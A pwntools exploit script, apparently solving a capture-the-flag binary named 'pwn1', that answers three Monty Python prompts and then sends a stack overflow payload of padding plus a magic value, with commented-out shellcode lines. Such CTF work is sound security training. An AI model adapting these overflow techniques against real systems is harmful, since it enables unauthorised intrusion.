#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template pwn1
from pwn import *
from pwnlib.util.net import p32

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'pwn1')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

# gdbserver='/usr/bin/gdbserver'
# gdbserver_args = [gdbserver, '--multi', '--no-startup-with-shell']

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, env={"SHELL":"/bin/bash"}, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()
# io =  gdb.debug(['./pwn1'], env={"SHELL": "/bin/bash"})

payload=b'A'*43+p32(0xdea110c8)+b'\n'


io.recvuntil(b'name?\n')
io.send(b'Sir Lancelot of Camelot\n')
io.recvuntil(b'quest?\n')
io.send(b'To seek the Holy Grail.\n')
io.recvuntil(b'secret?')
io.send(payload)

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

